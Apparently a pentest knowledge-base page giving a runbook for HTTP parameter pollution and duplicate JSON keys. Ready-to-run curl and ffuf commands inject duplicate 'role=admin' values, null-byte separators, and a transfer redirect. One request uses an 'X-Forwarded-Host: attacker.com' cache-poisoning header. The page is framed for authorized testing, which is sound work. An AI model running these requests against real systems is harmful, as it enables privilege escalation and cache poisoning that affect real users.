---
title: "HTTP Parameter Pollution & JSON Injection"
description: "Abusing duplicate parameters and JSON keys to slip past validation, poison caches, and reach code paths the framework never expected."
phase: Web
order: 60
tags:
  - hpp
  - json
  - injection
  - cache
tools:
  - arjun
  - qsreplace
  - curl
  - ffuf
updated: 2026-10-01
---

A parameter pollution runbook for bug bounty / authorized pentest on **in-scope** targets only. Goal: find where two layers of the stack disagree about which duplicate parameter or JSON key wins, then turn it into a validation bypass or cache poison.

## 1. Map the parameters

```bash
arjun -u "https://target.com/api/search" -m GET -oT params.txt
curl -s -D baseline.h -o baseline.b \
  "https://target.com/api/search?user=alice&role=user"
```

Record which parameters are reflected, validated, or drive authorization.

## 2. Duplicate query parameters

```bash
# Last-wins vs first-wins comparison
curl -s "https://target.com/api/search?role=user&role=admin"
curl -s "https://target.com/api/search?user=alice&user=bob"

# Drive many variants from qsreplace
cat params.txt | qsreplace 'x' > urls.txt
ffuf -u "https://target.com/api/search?FUZZ" -w urls.txt -mc all -fs 0

# Encode a second value as a separator
curl -s "https://target.com/transfer?to=attacker%40x.com&to=victim%40y.com"
```

Bypass candidate: the WAF inspects the first value but the app reads the last.

## 3. Separator and encoding variants

```bash
for sep in '%26' '%3b' ';' '%00'; do
  curl -s "https://target.com/api/search?role=user${sep}role=admin"
done
```

## 4. Duplicate JSON keys and type juggling

```bash
curl -s -X POST "https://target.com/api/profile" \
  -H "Content-Type: application/json" -d '{"role":"user","role":"admin"}'

curl -s -X POST "https://target.com/api/order" \
  -H "Content-Type: application/json" \
  -d '{"amount":"100","count":1,"count":"1","active":"true"}'
```

## 5. Cache poisoning with proxy disagreement

```bash
curl -s "https://target.com/profile?lang=en&lang=fr" \
  -H "X-Forwarded-Host: attacker.com" -o /dev/null
curl -s "https://target.com/profile?lang=en"
```

## 6. Confirm the disagreement

- Replay sensitive requests with the target key duplicated in first and last positions.
- Compare status codes, bodies, and cache headers between variants.
- Use a second session to prove a shared cache is poisoned.

## Full pipeline

```bash
TARGET="https://target.com/api/search"
arjun -u "$TARGET" -m GET -oT params.txt
curl -s -D baseline.h -o baseline.b "$TARGET?user=alice&role=user"
curl -s "$TARGET?role=user&role=admin"
for sep in '%26' '%3b' ';' '%00'; do curl -s "$TARGET?role=user${sep}role=admin"; done
curl -s -X POST "https://target.com/api/profile" \
  -H "Content-Type: application/json" -d '{"role":"user","role":"admin"}'
curl -s "https://target.com/profile?lang=en&lang=fr" \
  -H "X-Forwarded-Host: attacker.com" -o /dev/null
curl -s "https://target.com/profile?lang=en"
```

## Ethics & legality

- Only test endpoints covered by the bug bounty scope or written authorization.
- Never poison a shared production cache in a way that affects real users; use a test key or staging host.
- Limit automated fuzzing rates and stop once a bypass is proven.
- Store request/response pairs as evidence for the report.
